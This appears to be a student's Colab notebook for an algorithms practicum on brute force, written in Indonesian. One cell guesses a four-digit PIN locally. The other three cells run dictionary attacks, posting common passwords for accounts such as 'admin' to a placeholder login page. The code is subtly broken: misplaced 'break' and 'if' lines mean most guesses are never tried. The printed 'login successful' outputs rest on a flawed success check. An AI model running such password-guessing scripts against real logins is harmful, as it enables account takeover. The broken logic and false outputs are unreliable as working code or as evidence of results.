{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyN04OEzol0eYxic5lRwt4u8",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/YazidIrfan/Praktikum-Desain-Analisis-Dan-Algoritma-PrakDAA-/blob/main/Algoritma_Brute_Force_Yazid_Irfan_20220039.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import itertools\n",
        "def brute_force():\n",
        "    password = input(\"Masukkan kata sandi numerik 4 digit: \")\n",
        "    chars = \"0123456789\"\n",
        "    attempts = 0\n",
        "\n",
        "    for password_length in range(1, 5):\n",
        "        for guess in itertools.product(chars, repeat=password_length):\n",
        "            attempts += 1\n",
        "            guess = ''.join(guess)\n",
        "        if guess == password:\n",
        "            print(f\"Kata sandi ditemukan setelah {attempts} percobaan.\")\n",
        "            return\n",
        "            print(\"Kata sandi tidak ditemukan.\")\n",
        "brute_force()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "v5MUXaCa__cZ",
        "outputId": "8f30f9b9-a22c-4fee-a003-aea7c5db3bb0"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Masukkan kata sandi numerik 4 digit: 9999\n",
            "Kata sandi ditemukan setelah 11110 percobaan.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "passwords = ['password', '12345', 'qwerty', 'admin', 'letmein']\n",
        "for password in passwords:\n",
        "    response = requests.post('http://example.com/login', data={'username': 'user', 'password': password})\n",
        "    if response.status_code == 200:\n",
        "        print(f\"Paassword yang tepat adalah: {password}\")\n",
        "    break"
      ],
      "metadata": {
        "id": "eaSl73t4Acce"
      },
      "execution_count": 10,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "username = 'admin'\n",
        "url = 'https://example.com/login'\n",
        "# Daftar password yang akan dicoba\n",
        "passwords = ['password', '12345', 'qwerty', 'admin', 'letmein']\n",
        "for password in passwords:\n",
        " # Kirim data login ke halaman login\n",
        "    data = {'username': username, 'password': password}\n",
        "    response = requests.post(url, data=data)\n",
        " # Cek apakah login berhasil\n",
        "    if 'Login failed' not in response.text:\n",
        "        print(f\"Password yang tepat untuk akun {username} adalah {password}\")\n",
        "    break\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "3ooabKhTAqV4",
        "outputId": "6f6c5fd2-1059-496b-9178-4facccd23b3c"
      },
      "execution_count": 11,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Password yang tepat untuk akun admin adalah password\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 12,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "FeN7lysW_MzR",
        "outputId": "c89cb174-fdd7-4aa1-ff86-fcfa99ffb6ef"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Login berhasil! Username: admin, Password:password\n",
            "Login berhasil! Username: user, Password:password\n",
            "Login berhasil! Username: john, Password:password\n"
          ]
        }
      ],
      "source": [
        "import requests\n",
        "url = 'https://example.com/login'\n",
        "# Daftar username dan password yang akan dicoba\n",
        "usernames = ['admin', 'user', 'john']\n",
        "passwords = ['password', '123456', 'qwerty', 'admin']\n",
        "for username in usernames:\n",
        "    for password in passwords:\n",
        " # Kirim data login ke halaman login\n",
        "        data = {'username': username, 'password': password}\n",
        "        response = requests.post(url, data=data)\n",
        " # Cek apakah login berhasil\n",
        "        if 'Login failed' not in response.text:\n",
        "            print(f\"Login berhasil! Username: {username}, Password:{password}\")\n",
        "        break"
      ]
    }
  ]
}